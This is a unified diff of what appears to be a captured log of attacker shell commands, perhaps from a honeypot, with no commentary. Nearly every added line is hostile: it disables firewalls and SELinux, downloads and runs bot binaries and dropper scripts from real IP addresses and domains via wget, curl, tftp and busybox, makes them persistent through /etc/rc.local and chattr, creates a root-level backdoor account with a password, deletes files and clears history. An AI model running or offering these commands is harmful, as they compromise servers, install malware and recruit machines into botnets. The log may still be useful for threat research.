@@ -1,3 +1,141 @@
+rm *;wget -c http://45.33.57.185:9888/Linux-mips;wget -c http://45.33.57.185:9888/Linux-arm;wget -c http://45.33.57.185:9888/dd-wrt;chmod +x Linux-mips;chmod +x Linux-arm;chmod +x dd-wrt;chattr +i Linux-mips;chattr +i Linux-arm;chattr +i dd-wrt;./Linux-mips;./Linux-arm;./dd-wrt;echo "./Linux-mips&">>/etc/rc.local;echo "./Linux-arm&">>/etc/rc.local;echo "./dd-wrt&">>/etc/rc.local;echo "/etc/init.d/iptables stop">>/etc/rc.local;exit;
+wget -c http://45.33.57.185:9888/Control
+chmod +x Control
+./Control
+uname
+free -m
+ps x
+w
+uname -a
+/etc/init.d/iptables stop
+service iptables stop
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+cd /tmp
+wget http://222.186.130.158:9988/1
+chmod 777 1
+./1
+nohup /tmp/1 > /dev/null 2>&1 &
+cd /tmp
+wget http://222.186.130.158:9988/2
+chmod 777 2 
+./2
+nohup /tmp/2 > /dev/null 2>&1 &
+cd /tmp
+wget http://222.186.130.158:9988/3
+chmod 777 3
+./3
+nohup /tmp/3 > /dev/null 2>&1 &
+cd /tmp
+wget http://222.186.130.158:9988/4
+chmod 777 4
+./4
+nohup /tmp/4 > /dev/null 2>&1 &
+cd /tmp
+wget http://222.186.130.158:9988/5
+chmod 777 5
+./5
+nohup /tmp/5 > /dev/null 2>&1 &
+/etc/init.d/iptables stop
+service iptables stop
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+cd /tmp
+wget http://222.186.130.158:9988/11
+chmod 777 11
+./11
+nohup /tmp/11 > /dev/null 2>&11 &
+cd /tmp
+wget http://222.186.130.158:9988/22
+chmod 777 22
+./22
+nohup /tmp/22 > /dev/null 2>&11 &
+/etc/init.d/iptables stop
+service iptables stop
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+cd /tmp
+wget http://222.186.130.158:9988/11
+chmod 777 11
+./11
+nohup /tmp/1 > /dev/null 2>&1 &
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://222.186.129.219:1976/dirname;chmod 777 dirname;./dirname;
+free -m
+ils
+uname -a\
+una 
+ls -a
+curl -o /tmp/007 http://23.234.25.140:15826/007
+curl -o /tmp/007 http://23.234.25.140:15826/007
+curl -o /tmp/007 http://23.234.25.140:15826/007
+curl -o /tmp/007 http://23.234.25.140:15826/007
+curl -o /tmp/007 http://23.234.25.140:15826/007
+curl -o /tmp/007 http://23.234.25.140:15826/007
+curl -o /tmp/007 http://23.234.25.140:15826/007
+curl -o /tmp/007 http://23.234.25.140:15826/007
+curl -o /tmp/007 http://23.234.25.140:15826/007
+curl -o /tmp/007 http://23.234.25.140:15826/007
+curl -o /tmp/007 http://23.234.25.140:15826/007
+curl -o /tmp/007 http://23.234.25.140:15826/007
+curl -o /tmp/007 http://23.234.25.140:15826/007
+curl -o /tmp/007 http://23.234.25.140:15826/007
+/tmp/007
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh;sh blj.sh;exit &
+curl -O http://208.67.1.238/armv6;chmod +x armv6;./armv6;rm -f armv6;curl -O http://208.67.1.238/armv7;chmod +x armv7;./armv7
+cd /tmp; rm -rf gb.sh; wget -q http://23.94.97.5/Sharky/gb.sh; sh gb.sh
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh;sh blj.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh;sh blj.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh;sh blj.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh;sh blj.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh;sh blj.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh;sh blj.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh;sh blj.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh;sh blj.sh;exit &
+cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://208.67.1.238/bin.sh;sh bin.sh;busybox tftp -r bin2.sh -g 208.67.1.238;sh bin2.sh;busybox tftp 208.67.1.238 -c get bin3.sh;sh bin3.sh;busybox ftpget 208.67.1.238 bin4.sh;sh bin4.sh;exit
+cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://208.67.1.238/bin.sh;sh bin.sh;busybox tftp -r bin2.sh -g 208.67.1.238;sh bin2.sh;busybox tftp 208.67.1.238 -c get bin3.sh;sh bin3.sh;busybox ftpget 208.67.1.238 bin4.sh;sh bin4.sh;exit
+cd /tmp; rm -rf gb.sh; wget -q http://23.94.97.5/Sharky/gb.sh; sh gb.sh
+cat /proc/cpuinfo
+clear
+ls
+wget p-o-c.hi2.ro/poc.pl
+perl poc.pl
+ls
+rm -rf poc.pl
+history -c
+cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://208.67.1.238/bin.sh;sh bin.sh;busybox tftp -r bin2.sh -g 208.67.1.238;sh bin2.sh;busybox tftp 208.67.1.238 -c get bin3.sh;sh bin3.sh;busybox ftpget 208.67.1.238 bin4.sh;sh bin4.sh;exit
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;cd /tmp;wget -c http://222.186.129.248:52911/bhcnby;chmod 777 bhcnby;./bhcnby;echo "cd /tmp/">>/etc/rc.local;echo "./bhcnby&">>/etc/rc.local;echo "/etc/init.d/iptables stop">>/etc/rc.local;
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;cd /tmp;wget -c http://222.186.129.248:52911/bhcnby;chmod 777 bhcnby;./bhcnby;echo "cd /tmp/">>/etc/rc.local;echo "./bhcnby&">>/etc/rc.local;echo "/etc/init.d/iptables stop">>/etc/rc.local;
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;cd /tmp;wget -c http://222.186.129.248:52911/bhcnba;chmod 777 bhcnba;./bhcnba;echo "cd /tmp/">>/etc/rc.local;echo "./bhcnba&">>/etc/rc.local;echo "/etc/init.d/iptables stop">>/etc/rc.local;
+cd /tmp || cd /var/run;wget http://208.67.1.62/.free.sh;sh .free.sh;rm -rf .free.sh;tftp -r .zone.sh -g 208.67.1.62;sh .zone.sh; tftp 208.67.1.62 -c get .zone1.sh; sh .zone1.sh; rm -rf .zone.sh .zone1.sh .free.sh
+cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://185.45.193.254/bin.sh;sh bin.sh;busybox tftp -r bin2.sh -g 185.45.193.254;sh bin2.sh;busybox tftp 185.45.193.254 -c get bin3.sh;sh bin3.sh;busybox ftpget 185.45.193.254 bin4.sh;sh bin4.sh;exit
+service iptables stop
+wget http://104.223.72.158:8080/Linux-udp25000
+uname -m
+uname -r
+useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter
+echo "xuelp123"|passwd --stdin butter
+echo butter:xuelp123|chpasswd
+id -u
+service iptables stop
+wget http://104.223.72.158:8080/Linux-syn25000
+uname -m
+uname -r
+useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter
+echo "xuelp123"|passwd --stdin butter
+echo butter:xuelp123|chpasswd
+id -u
+./Linux-syn25000 &
+chmod u+x dos6cc4
+./Linux-syn25000 &
+cd /tmp
+echo "cd  /root/">>/etc/rc.local
+echo "./Linux-syn25000&">>/etc/rc.local
+echo "./Linux-syn25000&">>/etc/rc.local
+echo "/etc/init.d/iptables stop">>/etc/rc.local
+wget http://222.186.21.81:6604/xx
+chmod 777 xx
+./xx
+history -c
 id
 useradd -G root hades
 unmeae -r
@@ -38,16 +176,76 @@ free -m
 ps x
 curl -o /tmp/udp http://23.234.25.140:15826/udp
 /tmp/udp
+(uname -a)
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;cd /tmp;wget -c http://222.186.129.248:54922/bhcnba;chmod 777 bhcnba;./bhcnba;echo "cd /tmp/">>/etc/rc.local;echo "./bhcnba&">>/etc/rc.local;echo "/etc/init.d/iptables stop">>/etc/rc.local;
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;cd /tmp;wget -c http://222.186.129.248:54922/bhcnba;chmod 777 bhcnba;./bhcnba;echo "cd /tmp/">>/etc/rc.local;echo "./bhcnba&">>/etc/rc.local;echo "/etc/init.d/iptables stop">>/etc/rc.local;
+cd /tmp || cd /var/run;wget http://208.67.1.62/.free.sh;sh .free.sh;rm -rf .free.sh;tftp -r .zone.sh -g 208.67.1.62;sh .zone.sh; tftp 208.67.1.62 -c get .zone1.sh; sh .zone1.sh; rm -rf .zone.sh .zone1.sh .free.sh
+cd /tmp || cd /var/run;wget http://208.67.1.62/.free.sh;sh .free.sh;rm -rf .free.sh;tftp -r .zone.sh -g 208.67.1.62;sh .zone.sh; tftp 208.67.1.62 -c get .zone1.sh; sh .zone1.sh; rm -rf .zone.sh .zone1.sh .free.sh
+cd /tmp; rm -rf gb.sh; wget -q http://23.94.97.5/Sharky/gb.sh; sh gb.sh
+service iptables stop
+chkconfig iptables off
+/etc/init.d/iptables status
+/etc/init.d/iptables stop
+setenforce 0
+/sbin/chkconfig --level 2345 iptables off
+service iptables stop
 /etc/init.d/iptables stop
 service iptables stop
-SuSEfirewall2 stop
-reSuSEfirewall2 stop
+iptables -P INPUT ACCEPT
+iptables -P FORWARD ACCEPT
+iptables -P OUTPUT ACCEPT
+iptables -F
+systemctl stop firewalld.service
+systemctl disable firewalld.service
+wget -c http://104.223.72.230:8080/jiuwuer
+./yjiuwuer
+chmod 0755 /root/yjiuwuer
+nohup /root/jiuwuer &gt; /dev/null 2&gt;&amp;1 &amp;
+chmod 0777 jiuwuer
+chmod u+x jiuwuer
+./jiuwuer &
+chmod u+x jiuwuer
+./jiuwuer &
 cd /tmp
-wget -c http://115.230.126.87:1268/0407.25535
-chmod 0777 0407.25535
-./0407.25535
-echo "cd /tmp/">>/etc/rc.local
-echo "./0407.25535&">>/etc/rc.local
+service iptables stop
+chkconfig iptables off
+/etc/init.d/iptables status
+/etc/init.d/iptables stop
+setenforce 0
+/sbin/chkconfig --level 2345 iptables off
+service iptables stop
+/etc/init.d/iptables stop
+service iptables stop
+iptables -P INPUT ACCEPT
+iptables -P FORWARD ACCEPT
+iptables -P OUTPUT ACCEPT
+iptables -F
+systemctl stop firewalld.service
+systemctl disable firewalld.service
+wget -c http://104.223.72.230:8080/jiuwuer
+nohup /root/jiuwuer &gt; /dev/null 2&gt;&amp;1 &amp;
+chmod 0777 jiuwuer
+chmod u+x jiuwuer
+./jiuwuer &
+chmod u+x jiuwuer
+./jiuwuer &
+cd /tmp
+echo "cd  /root/">>/etc/rc.local
+echo "./jiuwuer&">>/etc/rc.local
+echo "./jiuwuer&">>/etc/rc.local
+echo "/etc/init.d/iptables stop">>/etc/rc.local
+echo "WinSCP: this is end-of-file:0"
+echo "WinSCP: this is end-of-file:0"
+echo "WinSCP: this is end-of-file:0"
+echo "WinSCP: this is end-of-file:0"
+service iptables stop
+wget http://104.223.72.158:8080/yxhl
+echo "cd  /root/">>/etc/rc.local
+echo "./yxhl&">>/etc/rc.local
+echo "./yxhl&">>/etc/rc.local
+echo "/etc/init.d/iptables stop">>/etc/rc.local
+service iptables stop
+wget http://104.223.72.158:8080/Manager
 echo "/etc/init.d/iptables stop">>/etc/rc.local
 /etc/init.d/iptables stop
 service iptables stop
@@ -60,39 +258,17 @@ chmod 0777 0407.25535
 echo "cd /tmp/">>/etc/rc.local
 echo "./0407.25535&">>/etc/rc.local
 echo "/etc/init.d/iptables stop">>/etc/rc.local
-ifcongfig
-ifconfig
-curl -o /tmp/g251 http://23.234.25.140:15826/g251
-clear
-ls
-perl
-ls
-perl
-clear
+/etc/init.d/iptables stop
 service iptables stop
-wget http://115.231.218.31:888/333
-nohup /root/333 > /dev/null 2>&1 &
-wget http://115.231.218.31:888/222
-nohup /root/222 > /dev/null 2>&1 &
-cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; rm -f *; wget http://199.180.134.199/bin.sh; sh bin.sh; rm -rf bin.sh; tftp -r tftp1.sh -g 199.180.134.199; sh tftp1.sh; tftp 199.180.134.199 -c get tftp2.sh; sh tftp2.sh; rm -rf bin.sh tftp1.sh tftp2.sh
-;s
-ls
-pwd
-wget http://123.1.169.48/aa
-ls
-wget http://123.1.169.48/aa
-wget http://123.1.169.48/aa
-wget http://123.1.169.48/aa
-wget http://123.1.169.48
-wget http://123.1.169.48/aa
-wget http://123.1.169.48/aa
-wget http://123.1.169.48/aa
-chmod 0755 aa
-nohup /root/aa > /dev/null 2>&1 &
-ls
-nohup /root/aa > /dev/null 2>&1 &
-nohup /root/aa > /dev/null 2>&1 &
-nohup /root/aa > /dev/null 2>&1 &
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+cd /tmp
+wget -c http://115.230.126.87:1268/0407.25535
+chmod 0777 0407.25535
+./0407.25535
+echo "cd /tmp/">>/etc/rc.local
+echo "./0407.25535&">>/etc/rc.local
+echo "/etc/init.d/iptables stop">>/etc/rc.local
 cd /tmp; rm -rf gb.sh; wget -q http://23.94.97.5/Sharky/gb.sh; sh gb.sh
 cd /tmp; rm -rf gb.sh; wget -q http://23.94.97.5/Sharky/gb.sh; sh gb.sh
 cd /tmp; rm -rf gb.sh; wget -q http://23.94.97.5/Sharky/gb.sh; sh gb.sh
@@ -409,3 +585,1240 @@ id
 /etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://69.12.77.199:92/syn1;chmod 777 syn1;./syn1;
 /etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://69.12.77.199:92/syn;chmod 777 syn;./syn;
 /etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://69.12.77.199:92/roo1;chmod 777 roo1;./roo1;
+ifcongfig
+ifconfig
+curl -o /tmp/g251 http://23.234.25.140:15826/g251
+clear
+ls
+perl
+ls
+perl
+clear
+service iptables stop
+wget http://115.231.218.31:888/333
+nohup /root/333 > /dev/null 2>&1 &
+wget http://115.231.218.31:888/222
+nohup /root/222 > /dev/null 2>&1 &
+cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; rm -f *; wget http://199.180.134.199/bin.sh; sh bin.sh; rm -rf bin.sh; tftp -r tftp1.sh -g 199.180.134.199; sh tftp1.sh; tftp 199.180.134.199 -c get tftp2.sh; sh tftp2.sh; rm -rf bin.sh tftp1.sh tftp2.sh
+;s
+ls
+pwd
+wget http://123.1.169.48/aa
+ls
+wget http://123.1.169.48/aa
+wget http://123.1.169.48/aa
+wget http://123.1.169.48/aa
+wget http://123.1.169.48
+wget http://123.1.169.48/aa
+wget http://123.1.169.48/aa
+wget http://123.1.169.48/aa
+chmod 0755 aa
+nohup /root/aa > /dev/null 2>&1 &
+ls
+nohup /root/aa > /dev/null 2>&1 &
+nohup /root/aa > /dev/null 2>&1 &
+nohup /root/aa > /dev/null 2>&1 &
+wget http://222.186.56.217:6555/Client;chmod 777 Client;./Client;
+wget http://222.186.56.217:6555/Client;chmod 777 Client;./Client;
+wget http://222.186.56.217:6555/Client;chmod 777 Client;./Client;
+curl -o /tmp/007 http://23.234.25.140:15827/007
+chmod 777 /tmp/007
+/tmp/007
+curl -o /tmp/007 http://23.234.25.140:15827/007
+/tmp/007
+wget http://222.186.56.217:6555/Client
+chmod 777 Client
+./Client
+wget http://208.67.1.238/armv6;chmod +x armv6;./armv6;rm -f armv6;wget http://208.67.1.238/armv7;chmod +x armv7;./armv7
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+/etc/init.d/iptables stop
+service iptables stop
+SuSEfirewall2 stop
+uname
+reSuSEfirewall2 stop
+free -m
+ps x
+cd /tmp
+wget -c http://115.230.126.87:11123/xy-arm
+chmod 0777 xy-arm
+./xy-arm
+cd /tmp
+wget -c http://115.230.126.87:11123/xy-wrt
+chmod 0777 xy-wrt
+uname
+./xy-wrt
+free -m
+cd /tmp
+ps x
+wget -c http://115.230.126.87:11123/2384l
+chmod 0777 2384l
+./2384l
+echo "cd /tmp/">>/etc/rc.local
+echo "./xy-arm&">>/etc/rc.local
+echo "./xy-wrt&">>/etc/rc.local
+echo "./2384l&">>/etc/rc.local
+uname
+echo "/etc/init.d/iptables stop">>/etc/rc.local
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh || tftp -r blj.sh -g 149.202.153.56 || tftp 149.202.153.56 -c get blj.sh;sh blj.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh || tftp -r blj.sh -g 149.202.153.56 || tftp 149.202.153.56 -c get blj.sh;sh blj.sh;exit &
+cd /tmp; rm -rf gb.sh; wget -q http://23.94.97.5/Sharky/gb.sh; sh gb.sh
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+cd ..
+cd ..
+cd ..
+cd ..
+cd tmp
+wget http://115.239.248.50:231/iisyn
+chmod 777 iisyn
+chmod 0755 iisyn
+nohup /tmp/iisyn > /dev/null 2>&1 &
+./iisyn &
+chattr +i iisyn
+wget http://115.239.248.50:231/iis
+chmod 777 iis
+./iis &
+chattr +i iis
+wget http://115.239.248.50:231/iiudp
+chmod 777 iiudp
+chmod 0755 iiudp
+nohup /tmp/iiudp > /dev/null 2>&1 &
+./iiudp &
+chattr +i iiudp
+exit
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh;sh blj.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh;sh blj.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh;sh blj.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh;sh blj.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://badluckjosh.pw/dongs/blj.sh || busybox wget http://badluckjosh.pw/dongs/blj.sh || curl -O http://badluckjosh.pw/dongs/blj.sh || busybox curl -O http://badluckjosh.pw/dongs/blj.sh;sh blj.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://46.101.16.226/poo.sh || busybox wget http://46.101.16.226/poo.sh || curl -O http://46.101.16.226/poo.sh || busybox curl -O http://46.101.16.226/poo.sh;sh poo.sh;exit &
+cd /tmp || cd /var/run;wget http://208.67.1.62/.free.sh;sh .free.sh;rm -rf .free.sh;tftp -r .zone.sh -g 208.67.1.62;sh .zone.sh; tftp 208.67.1.62 -c get .zone1.sh; sh .zone1.sh; rm -rf .zone.sh .zone1.sh .free.sh
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://46.101.16.226/poo.sh || busybox wget http://46.101.16.226/poo.sh || curl -O http://46.101.16.226/poo.sh || busybox curl -O http://46.101.16.226/poo.sh;sh poo.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://46.101.16.226/poo.sh || busybox wget http://46.101.16.226/poo.sh || curl -O http://46.101.16.226/poo.sh || busybox curl -O http://46.101.16.226/poo.sh;sh poo.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://46.101.16.226/poo.sh || busybox wget http://46.101.16.226/poo.sh || curl -O http://46.101.16.226/poo.sh || busybox curl -O http://46.101.16.226/poo.sh;sh poo.sh;exit &
+cd /tmp || cd /var/run || cd /var/tmp;rm -f *;wget http://46.101.16.226/poo.sh || busybox wget http://46.101.16.226/poo.sh || curl -O http://46.101.16.226/poo.sh || busybox curl -O http://46.101.16.226/poo.sh;sh poo.sh;exit &
